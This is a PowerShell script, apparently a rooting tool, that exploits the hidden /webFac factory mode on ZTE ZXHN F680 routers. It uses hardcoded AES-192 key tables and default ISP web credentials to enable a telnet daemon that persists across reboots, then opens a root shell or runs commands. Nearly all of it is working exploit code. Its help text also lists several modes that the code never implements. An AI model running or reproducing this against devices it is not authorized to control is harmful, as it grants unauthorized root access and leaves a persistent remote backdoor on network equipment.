<#
.SYNOPSIS
    ZTE ZXHN F680 - open factory mode and drop into a root shell.

.DESCRIPTION
    Talks the /webFac factory-mode protocol (AES-192-ECB over HTTP) to enable
    telnetd, then opens an interactive console on port 23.

    Credentials rotate on every run. Telnetd stays enabled across reboots.

.EXAMPLE
    .\f680-root.ps1
    Prints this help.

.EXAMPLE
    .\f680-root.ps1 -Shell
    Gets access and opens the console.

.EXAMPLE
    .\f680-root.ps1 -Creds
    Prints fresh telnet credentials only.

.EXAMPLE
    .\f680-root.ps1 -Check
    Probes whether the factory surface exists.

.EXAMPLE
    .\f680-root.ps1 -Status
    Read-only health report.

.EXAMPLE
    .\f680-root.ps1 -Exec "ls /bin"
    Runs one command and exits.
#>

[CmdletBinding()]
param(
    [string]$Ip = '192.168.1.1',
    [int]$Port = 80,
    [Alias('u')][string]$User = 'mgts',
    [Alias('p')][string]$Pass = 'mtsoao',
    [int]$Rand = -1,
    [switch]$Shell,
    [switch]$Creds,
    [switch]$Check,
    [switch]$Status,
    [string]$Exec,
    [switch]$Help,
    [switch]$Quiet
)

$ErrorActionPreference = 'Stop'

function Show-Help {
    $n = 'f680-root.ps1'
    @"
$n - root shell on a ZTE ZXHN F680 (MGTS V9.1.10P1N9)
            via the hidden /webFac factory mode

usage: $n [mode] [options]

modes (pick one; none prints this help):
  -shell          open an interactive console
  -status         read-only health report over telnet
  -exec "CMD"     run one command on the router, print its output
  -creds          print the telnet user and password only
  -check          probe /webFac and exit, change nothing
  -config [DIR]   download the event log and config
  -menu           interactive menu: TR-069, tuning, telnet

options:
  -ip <addr>      router address          default 192.168.1.1
  -port <n>       web port                default 80
  -u, -user <n>   web login               default mgts
  -p, -pass <pw>  web password            default mtsoao
  -host <addr>    this machine as the router sees it (for -config)
  -rand <0-59>    pin the key slot instead of picking one at random
  -retries <n>    handshake attempts      default 4
  -timeout <sec>  HTTP timeout            default 20
  -dry-run        with -menu: print commands instead of writing
  -quiet          print only the result
  -h, -help       this help

examples:
  $n -shell
  $n -status
  $n -exec "displayDB DevInfo"
  $n -ip 192.168.1.1 -u mgts -p mtsoao -creds

notes:
  one dash or two, same thing: -status == --status
  credentials rotate on every run; the previous password stops working
  telnetd survives reboots, so after a restart just re-run
  telnet allows two sessions; a closed one holds its slot for 300 seconds
"@ | Write-Host
}

if ($Help -or (-not $Shell -and -not $Creds -and -not $Check -and -not $Status -and -not $Exec)) {
    Show-Help
    exit 0
}

function Say([string]$Message) {
    if (-not $Quiet -and -not $Creds -and -not $Check) { Write-Host $Message }
}

# --- telnet plumbing --------------------------------------------------------

$script:stream = $null
$script:client = $null
$script:pending = New-Object System.Collections.Generic.List[byte]
$script:sink = $null
$script:seq = 0

function Read-Available {
    # Drain the socket, strip telnet IAC sequences, send the text to the sink.
    if ($null -eq $script:stream) { return }
    if (-not $script:stream.DataAvailable) { return }
    $buf = New-Object byte[] 4096
    $n = $script:stream.Read($buf, 0, $buf.Length)
    if ($n -le 0) { return }
    for ($i = 0; $i -lt $n; $i++) { $script:pending.Add($buf[$i]) }

    $out = New-Object System.Text.StringBuilder
    $i = 0
    while ($i -lt $script:pending.Count) {
        $b = $script:pending[$i]
        if ($b -ne 255) { [void]$out.Append([char]$b); $i++; continue }

        if ($i + 1 -ge $script:pending.Count) { break }
        $cmd = $script:pending[$i + 1]

        if ($cmd -eq 250) {
            # Subnegotiation: skip to IAC SE.
            $j = $i
            while ($j + 1 -lt $script:pending.Count -and -not ($script:pending[$j] -eq 255 -and $script:pending[$j + 1] -eq 240)) { $j++ }
            if ($j + 1 -ge $script:pending.Count) { break }
            $i = $j + 2
            continue
        }
        if ($cmd -in 251, 252, 253, 254) {
            if ($i + 2 -ge $script:pending.Count) { break }
            $opt = $script:pending[$i + 2]
            $answer = if ($cmd -eq 253) { 252 } elseif ($cmd -eq 251) { 254 } else { $null }
            if ($null -ne $answer) {
                $resp = [byte[]]@(255, $answer, $opt)
                $script:stream.Write($resp, 0, 3)
                $script:stream.Flush()
            }
            $i += 3
            continue
        }
        $i += 2
    }
    $script:pending.RemoveRange(0, $i) | Out-Null

    $text = $out.ToString()
    if ($null -ne $script:sink) { [void]$script:sink.Append($text) }
    else { Write-Host $text -NoNewline }
}

function Connect-Telnet([string]$TUser, [string]$TPass) {
    $script:client = New-Object System.Net.Sockets.TcpClient
    try { $script:client.Connect($Ip, 23) }
    catch { Fail "cannot reach ${Ip}:23 - close other telnet sessions and retry" }
    $script:stream = $script:client.GetStream()
    $script:client.ReceiveTimeout = 0
    Start-Sleep -Milliseconds 700
    Read-Available
    $script:stream.Write([Text.Encoding]::ASCII.GetBytes("$TUser`r`n"), 0, $TUser.Length + 2)
    $script:stream.Flush()
    Start-Sleep -Milliseconds 700
    Read-Available
    $script:stream.Write([Text.Encoding]::ASCII.GetBytes("$TPass`r`n"), 0, $TPass.Length + 2)
    $script:stream.Flush()
    Start-Sleep -Milliseconds 900
    Read-Available
}

function Invoke-Remote([string]$Command) {
    # Markers go in as @@'SaN'@@ so the echoed command line cannot match them.
    $script:seq++
    $start = "@@Sa$($script:seq)@@"
    $stop = "@@Sb$($script:seq)@@"
    $line = "printf '\n'; echo @@'Sa$($script:seq)'@@; $Command; echo @@'Sb$($script:seq)'@@"
    $bytes = [Text.Encoding]::ASCII.GetBytes("$line`r`n")
    $script:stream.Write($bytes, 0, $bytes.Length)
    $script:stream.Flush()

    $sb = New-Object System.Text.StringBuilder
    $script:sink = $sb
    $deadline = [DateTime]::UtcNow.AddSeconds(20)
    while ([DateTime]::UtcNow -lt $deadline) {
        Read-Available
        if ($sb.ToString().Contains($stop)) { break }
        Start-Sleep -Milliseconds 100
    }
    $script:sink = $null

    $text = $sb.ToString()
    $i = $text.IndexOf($start)
    if ($i -lt 0) { return $text.Trim() }
    $text = $text.Substring($i + $start.Length)
    $j = $text.IndexOf($stop)
    if ($j -ge 0) { $text = $text.Substring(0, $j) }
    $text.Trim("`r", "`n")
}

function Fail([string]$Message) {
    Write-Host "[!] $Message" -ForegroundColor Red
    exit 1
}

# --- AES-192-ECB ------------------------------------------------------------

function Get-Aes([byte[]]$Key) {
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = [System.Security.Cryptography.CipherMode]::ECB
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::None
    $aes.Key = $Key
    $aes
}

function Add-Pad16([byte[]]$Data) {
    $rem = $Data.Length % 16
    if ($rem -eq 0) { return $Data }
    $padded = New-Object byte[] ($Data.Length + 16 - $rem)
    [Array]::Copy($Data, $padded, $Data.Length)
    $padded
}

function Invoke-AesEncrypt([byte[]]$Key, [byte[]]$Plain) {
    $aes = Get-Aes $Key
    try {
        $enc = $aes.CreateEncryptor()
        $enc.TransformFinalBlock((Add-Pad16 $Plain), 0, (Add-Pad16 $Plain).Length)
    } finally { $aes.Dispose() }
}

function Invoke-AesDecrypt([byte[]]$Key, [byte[]]$Cipher) {
    if ($Cipher.Length -eq 0 -or $Cipher.Length % 16 -ne 0) { return [byte[]]@() }
    $aes = Get-Aes $Key
    try {
        $dec = $aes.CreateDecryptor()
        $dec.TransformFinalBlock($Cipher, 0, $Cipher.Length)
    } finally { $aes.Dispose() }
}

# --- raw HTTP ---------------------------------------------------------------

function Invoke-RawPost {
    param([string]$Path, [byte[]]$Body = @())

    $client = New-Object System.Net.Sockets.TcpClient
    try {
        $client.Connect($Ip, $Port)
        $client.ReceiveTimeout = 20000
        $stream = $client.GetStream()

        $head = "POST /$Path HTTP/1.0`r`n" +
                "Host: ${Ip}:${Port}`r`n" +
                "Content-Type: application/octet-stream`r`n" +
                "User-Agent: Mozilla/5.0`r`n" +
                "Content-Length: $($Body.Length)`r`n" +
                "Connection: close`r`n`r`n"
        $hb = [Text.Encoding]::ASCII.GetBytes($head)
        $stream.Write($hb, 0, $hb.Length)
        if ($Body.Length -gt 0) { $stream.Write($Body, 0, $Body.Length) }
        $stream.Flush()

        $buffer = New-Object System.IO.MemoryStream
        $chunk = New-Object byte[] 8192
        while (($n = $stream.Read($chunk, 0, $chunk.Length)) -gt 0) {
            $buffer.Write($chunk, 0, $n)
        }
        $raw = $buffer.ToArray()
    } finally {
        $client.Close()
    }

    # Split headers from body.
    $sep = -1
    for ($i = 0; $i -lt $raw.Length - 3; $i++) {
        if ($raw[$i] -eq 13 -and $raw[$i + 1] -eq 10 -and $raw[$i + 2] -eq 13 -and $raw[$i + 3] -eq 10) {
            $sep = $i; break
        }
    }
    if ($sep -lt 0) { return @{ Status = 0; Body = $raw } }

    $headText = [Text.Encoding]::ASCII.GetString($raw, 0, $sep)
    $status = 0
    if ($headText -match '^HTTP/\d\.\d\s+(\d{3})') { $status = [int]$Matches[1] }

    $bodyLen = $raw.Length - ($sep + 4)
    $bodyBytes = if ($bodyLen -gt 0) {
        $tmp = New-Object byte[] $bodyLen
        [Array]::Copy($raw, $sep + 4, $tmp, 0, $bodyLen)
        $tmp
    } else { [byte[]]@() }

    @{ Status = $status; Body = $bodyBytes }
}

# --- key tables -------------------------------------------------------------

# Protocol prior art: douniwan5788/zte_modem_tools.
$PoolV1 = '7B56B0F7DA0E6852C819F32B849079E562F8EAD2649387DF73D7FBCCAAFE75431C29DF4C522C6E7B453D1FF1DEBC27858A4591BE3813DE673208541175F4D3B4A4B312866723994C617FB1D230DF47F17693A38C95D359BF878EF3B3E4764988'
$PoolV2 = '8C2365D1FC324537112871630720691473E7D453132436C2B5E1FCCF8A9A41893C49CF5C728C9EEB750D3FD1FECC57657A35213E68537E970248747195345384B4C3E2D6273DE65D729CBC3D03FD76C19C25A89247E4180F243F4F67EC97F499'

function Get-SliceKey([string]$Pool, [int]$Index) {
    # 24-byte slice at Index, every byte XOR 0xA5 -> AES-192 key.
    $hex = $Pool.Substring($Index * 2, 48)
    $key = New-Object byte[] 24
    for ($i = 0; $i -lt 24; $i++) {
        $key[$i] = [Convert]::ToByte($hex.Substring($i * 2, 2), 16) -bxor 0xA5
    }
    $key
}

function ConvertTo-Text([byte[]]$Bytes) {
    if ($Bytes.Length -eq 0) { return '' }
    [Text.Encoding]::UTF8.GetString($Bytes).Trim([char]0)
}

# --- handshake --------------------------------------------------------------

$reset = Invoke-RawPost -Path 'webFac' -Body ([Text.Encoding]::ASCII.GetBytes('SendSq.gch'))

if ($Check) {
    $text = [Text.Encoding]::ASCII.GetString($reset.Body)
    if ($reset.Status -eq 400 -and $text -match 'bad syntax') {
        Write-Host '[ok] /webFac factory surface present (HTTP 400)'
        exit 0
    }
    Write-Host "[--] /webFac not detected (HTTP $($reset.Status))"
    exit 3
}

Say "[1] reset              -> $($reset.Status)"

try {
    Invoke-RawPost -Path 'webFac' -Body ([Text.Encoding]::ASCII.GetBytes('RequestFactoryMode.gch')) | Out-Null
} catch {
    # The device drops the socket here; that is success.
}

if ($Rand -lt 0) { $Rand = Get-Random -Minimum 0 -Maximum 60 }

$sq = Invoke-RawPost -Path 'webFac' -Body ([Text.Encoding]::ASCII.GetBytes("SendSq.gch?rand=$Rand`r`n"))
if ($sq.Status -ne 200) { Fail "handshake refused (HTTP $($sq.Status)) - is the router up?" }

if ($sq.Body.Length -eq 0) {
    $key = Get-SliceKey $PoolV1 $Rand
    Say "[2] SendSq rand=$Rand      -> 200 (protocol v1)"
} else {
    $reply = [Text.Encoding]::ASCII.GetString($sq.Body).Trim([char]0, ' ', "`r", "`n")
    if ($reply -notmatch '^newrand=(\d+)$') { Fail "unexpected handshake reply: $reply" }
    $newRand = [int]$Matches[1]
    $index = (((0x1000193 * $Rand) -band 0x3F) -bxor $newRand) % 60
    $key = Get-SliceKey $PoolV2 $index
    Say "[2] SendSq rand=$Rand      -> 200 (protocol v2, slot $index)"

    $info = Invoke-AesEncrypt $key ([Text.Encoding]::ASCII.GetBytes('SendInfo.gch?info=6|'))
    try { Invoke-RawPost -Path 'webFacEntry' -Body $info | Out-Null } catch { }
    Say '[3] SendInfo           -> done'
}

$authBody = Invoke-AesEncrypt $key ([Text.Encoding]::ASCII.GetBytes("CheckLoginAuth.gch?version50&user=$User&pass=$Pass"))
$auth = Invoke-RawPost -Path 'webFacEntry' -Body $authBody
if ($auth.Status -ne 200) { Fail "login rejected (HTTP $($auth.Status)) - wrong web password?" }
Say "[4] CheckLoginAuth     -> $($auth.Status)"

$modeBody = Invoke-AesEncrypt $key ([Text.Encoding]::ASCII.GetBytes('FactoryMode.gch?mode=2&user=notused'))
$mode = Invoke-RawPost -Path 'webFacEntry' -Body $modeBody
if ($mode.Status -ne 200) { Fail "factory mode refused (HTTP $($mode.Status))" }
Say "[5] FactoryMode mode=2 -> $($mode.Status)"

$replyText = ConvertTo-Text (Invoke-AesDecrypt $key $mode.Body)
if ($replyText -notmatch 'FactoryModeAuth\.gch') { Fail "unexpected reply: $($replyText.Substring(0, [Math]::Min(120, $replyText.Length)))" }

$telUser = if ($replyText -match 'user=([^&\s]+)') { $Matches[1] } else { '' }
$telPass = if ($replyText -match 'pass=([^&\s]+)') { $Matches[1] } else { '' }
if (-not $telUser -or -not $telPass) { Fail "could not parse credentials: $replyText" }

# telnetd only allows Max_Con_Num=2 sessions and keeps a closed session's slot
# busy for ExitTime seconds, so never probe the port: connect exactly once.
if ($Creds) {
    Write-Host "host: $Ip"
    Write-Host "user: $telUser"
    Write-Host "pass: $telPass"
    Write-Host "telnet $Ip"
    exit 0
}

# --- status / exec ----------------------------------------------------------

function Get-Field([string]$Text, [string]$Name) {
    $pat = 'name="' + [regex]::Escape($Name) + '"\s+val="([^"]*)"'
    if ($Text -match $pat) { return $Matches[1] }
    ''
}

function Format-Span([long]$Seconds) {
    $d = [Math]::Floor($Seconds / 86400)
    $h = [Math]::Floor(($Seconds % 86400) / 3600)
    $m = [Math]::Floor(($Seconds % 3600) / 60)
    if ($d -gt 0) { return "${d}d ${h}h ${m}m" }
    if ($h -gt 0) { return "${h}h ${m}m" }
    "${m}m"
}

function Show-Status {
    $up = (Invoke-Remote 'cat /proc/uptime') -split '\s+'
    $cpu = Invoke-Remote 'cat /proc/cpuusage'
    $mem = Invoke-Remote 'free'
    $dev = Invoke-Remote 'displayDB DevInfo'
    $wan = Invoke-Remote 'ifconfig nbif0'
    $mgt = Invoke-Remote 'displayDB MgtServer'
    $tel = Invoke-Remote 'displayDB TelnetCfg'
    $hosts = Invoke-Remote 'displayDB DHCPSHostInfo'
    $arp = Invoke-Remote 'cat /proc/net/arp'
    $wdt = Invoke-Remote 'cat /proc/watchdog/ctrl'

    $cpuText = (($cpu -split "`n") | ForEach-Object { if ($_ -match 'Usage:\s*([\d.]+)%') { $Matches[1] + '%' } }) -join ' '
    $memTotal = 0; $memFree = 0
    foreach ($l in ($mem -split "`n")) {
        if ($l -match '^Mem:\s+(\d+)\s+(\d+)') { $memTotal = [long]$Matches[1]; $memFree = [long]$Matches[2] }
    }

    Write-Host ''
    Write-Host "  $($Ip)  $((Get-Field $dev 'ModelName'))  $((Get-Field $dev 'SoftwareVer'))"
    Write-Host "  firmware  $((Get-Field $dev 'VerDate'))"
    Write-Host "  serial    (masked by firmware)"
    Write-Host "  uptime    $(Format-Span ([long][double]$up[0]))"
    Write-Host "  cpu       $cpuText"
    if ($memTotal -gt 0) {
        $usedPct = [Math]::Round(100.0 * ($memTotal - $memFree) / $memTotal, 1)
        Write-Host "  memory    $usedPct% used ($memFree KB free of $memTotal KB)"
    }

    $ip = if ($wan -match 'inet addr:(\S+)') { $Matches[1] } else { '?' }
    $mask = if ($wan -match 'Mask:(\S+)') { $Matches[1] } else { '?' }
    $mac = if ($wan -match 'HWaddr (\S+)') { $Matches[1] } else { '?' }
    $rx = if ($wan -match 'RX packets:(\d+)') { $Matches[1] } else { '?' }
    $tx = if ($wan -match 'TX packets:(\d+)') { $Matches[1] } else { '?' }
    Write-Host "  wan       $ip / $mask  mac $mac"
    Write-Host "            rx $rx tx $tx"

    Write-Host "  tr-069    $((Get-Field $mgt 'URL')) enabled=$((Get-Field $mgt 'PeriodicInformEnable')) inform=$((Get-Field $mgt 'PeriodicInformInterval'))s upgrades=$((Get-Field $mgt 'UpgradesManaged'))"
    Write-Host "  telnet    enable=$((Get-Field $tel 'TS_Enable')) port=$((Get-Field $tel 'TS_Port')) max=$((Get-Field $tel 'Max_Con_Num'))"
    Write-Host "  watchdog  $(($wdt -split "`n" | Where-Object { $_.Trim() }) -join ' ')"

    # Leases vs ARP: a lease answered by another MAC means a duplicate IP.
    $leases = @()
    foreach ($row in ($hosts -split '<Row No="')) {
        if ($row -notmatch '^\d+"') { continue }
        $leases += [pscustomobject]@{
            Ip   = Get-Field $row 'IpAddr'
            Mac  = (Get-Field $row 'MacAddr').ToUpper()
            Name = Get-Field $row 'HostName'
        }
    }
    $arpMap = @{}
    foreach ($l in ($arp -split "`n")) {
        if ($l -match '^(\d+\.\d+\.\d+\.\d+)\s+0x\S+\s+\S+\s+(\S+)') {
            $arpMap[$Matches[1]] = $Matches[2].ToUpper()
        }
    }

    Write-Host ''
    Write-Host "  leases ($($leases.Count))"
    foreach ($l in $leases) {
        $real = $arpMap[$l.Ip]
        $flag = if ($real -and $real -ne $l.Mac) { '[!]' } else { '   ' }
        Write-Host "  $flag $($l.Ip.PadRight(15)) $($l.Mac)  $($l.Name)"
    }

    $conflicts = @($leases | Where-Object { $arpMap[$_.Ip] -and $arpMap[$_.Ip] -ne $_.Mac })
    if ($conflicts.Count -gt 0) {
        Write-Host ''
        Write-Host '  Address conflicts'
        foreach ($c in $conflicts) {
            Write-Host "  [!] $($c.Ip) is leased to $($c.Mac) but answers as $($arpMap[$c.Ip])"
        }
    }
    Write-Host ''
}

# --- console ----------------------------------------------------------------

Connect-Telnet $telUser $telPass
Say '[6] telnet             -> connected'

if ($Exec) {
    Invoke-Remote $Exec
    exit 0
}

if ($Status) {
    Show-Status
    exit 0
}

Write-Host ''
Write-Host "  ZTE F680 shell - 'exit' to leave. Credentials rotate every run."
Write-Host ''

try {
    $interactive = -not [Console]::IsInputRedirected
    if ($interactive) {
        # The device echoes what it receives, so do not echo locally.
        $line = ''
        while ($true) {
            Read-Available
            if ([Console]::KeyAvailable) {
                $k = [Console]::ReadKey($true)
                if ($k.Key -eq 'Enter') {
                    $script:stream.Write([Text.Encoding]::ASCII.GetBytes("`r`n"), 0, 2)
                    $script:stream.Flush()
                    if ($line -eq 'exit' -or $line -eq 'quit') { break }
                    $line = ''
                } elseif ($k.Key -eq 'Backspace') {
                    if ($line.Length -gt 0) {
                        $line = $line.Substring(0, $line.Length - 1)
                        # 0x7F is what the device's line editor erases with.
                        $script:stream.Write([byte[]]@(127), 0, 1)
                        $script:stream.Flush()
                    }
                } elseif ($k.KeyChar -ge ' ') {
                    # Send each keystroke at once so the device echoes it back.
                    $line += $k.KeyChar
                    $bytes = [Text.Encoding]::ASCII.GetBytes([string]$k.KeyChar)
                    $script:stream.Write($bytes, 0, $bytes.Length)
                    $script:stream.Flush()
                }
            } else {
                Start-Sleep -Milliseconds 40
            }
        }
    } else {
        while ($null -ne ($line = [Console]::In.ReadLine())) {
            $script:stream.Write([Text.Encoding]::ASCII.GetBytes("$line`r`n"), 0, $line.Length + 2)
            $script:stream.Flush()
            if ($line -eq 'exit' -or $line -eq 'quit') { break }
            $deadline = [DateTime]::UtcNow.AddSeconds(3)
            while ([DateTime]::UtcNow -lt $deadline) { Read-Available; Start-Sleep -Milliseconds 60 }
        }
    }

    Start-Sleep -Milliseconds 1200
    Read-Available
} finally {
    $script:client.Close()
}
